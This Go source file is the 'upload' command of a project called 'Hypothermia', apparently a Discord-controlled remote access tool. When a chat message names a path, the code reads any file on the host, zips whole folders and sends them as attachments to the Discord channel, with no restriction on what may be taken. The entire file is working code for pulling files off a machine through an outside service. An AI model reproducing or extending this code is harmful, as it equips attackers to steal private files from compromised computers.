package commands

import (
	"os"
	"strings"

	"Hypothermia/src/utils"
	"github.com/bwmarrin/discordgo"
)

const (
	uploadUsage string = "[path]"

	uploadFormatError   string = "🟥 Expected a ending quote."
	uploadArgsError     string = "🟥 Expected 1 argument."
	uploadFileInfoError string = "🟥 Failed to get info about the path."
	uploadZipError      string = "🟥 Failed to zip folder."
	uploadOpenFileError string = "🟥 Failed to open file."
)

func (*UploadCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, uploadArgsError+"\nUsage: "+uploadUsage, m.Reference())
		return
	}

	var path string
	if strings.HasPrefix(args[0], "\"") {
		joined := strings.Join(args, " ")
		start := strings.Index(joined, "\"") + 1
		end := strings.Index(joined[start:], "\"") + start

		if start == 0 || end == -1 {
			s.ChannelMessageSendReply(m.ChannelID, uploadFormatError, m.Reference())
			return
		}

		path = joined[start:end]
	} else {
		path = args[0]
	}

	info, err := os.Stat(path)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, uploadFileInfoError, m.Reference())
		return
	}

	var filePath string
	var fileName string

	if info.IsDir() {
		filePath, err = utils.ZipFolder(path)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, uploadZipError, m.Reference())
			return
		}

		fileName = info.Name() + ".zip"
	} else {
		filePath = path
		fileName = info.Name()
	}

	file, err := os.Open(filePath)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, uploadOpenFileError, m.Reference())
		return
	}

	defer file.Close()

	s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
		Reference: m.Reference(),
		Files: []*discordgo.File{{
			Name:        fileName,
			ContentType: "application/octet-stream",
			Reader:      file,
		}},
	})
}

func (*UploadCommand) Name() string {
	return "upload"
}

func (*UploadCommand) Info() string {
	return "uploads a chosen file or folder"
}

type UploadCommand struct{}
